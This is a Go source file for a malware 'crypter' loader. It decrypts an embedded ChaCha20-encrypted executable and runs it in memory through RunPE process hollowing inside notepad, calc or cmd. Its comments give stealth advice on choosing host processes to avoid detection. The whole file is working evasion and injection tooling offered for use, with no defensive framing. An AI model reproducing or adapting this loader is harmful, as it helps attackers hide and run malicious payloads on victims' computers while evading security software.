package main

import (
	_ "embed"
	"log"
	"os"
	"path/filepath"

	"golang.org/x/crypto/chacha20"
	"crypter/internal/runpe"
)

//go:embed encrypted_Input.bin
var encryptedBytes []byte

//go:embed key.txt
var keyData []byte

func main() {
	peBytes, err := decryptFile()
	if err != nil {
		log.Fatalf("Failed to decrypt file: %v", err)
	}
	fileless(peBytes)
}

func decryptFile() ([]byte, error) {
	keyBytes := keyData[:32]
	nonceBytes := keyData[32:44]

	cipher, err := chacha20.NewUnauthenticatedCipher(keyBytes, nonceBytes)
	if err != nil {
		return nil, err
	}

	decryptedBytes := make([]byte, len(encryptedBytes))
	cipher.XORKeyStream(decryptedBytes, encryptedBytes)

	return decryptedBytes, nil
}

func fileless(execBytes []byte) {
	// Try multiple potential target processes in case one fails, these can be configured to your liking
	// Preferably, local user space accessible processes (avoid System32 processes if you really want to be stealthy, like OneDrive or Chrome)
	// Note: This is a simplified example. In a real-world scenario, you would want to check if the target process is running and if it has the necessary permissions.
	
	targetPaths := []string{
		filepath.Join(os.Getenv("WINDIR"), "System32", "notepad.exe"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "calc.exe"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "cmd.exe"),
	}
	
	var lastErr error
	for _, targetPath := range targetPaths {
		err := runpe.ExecuteInMemory(execBytes, targetPath)
		if err == nil {
			log.Println("RunPE memory execution completed successfully using", targetPath)
			return
		}
		lastErr = err
		log.Printf("Failed to execute using %s: %v, trying next target...", targetPath, err)
	}
	
	log.Fatalf("All RunPE execution attempts failed. Last error: %v", lastErr)
} 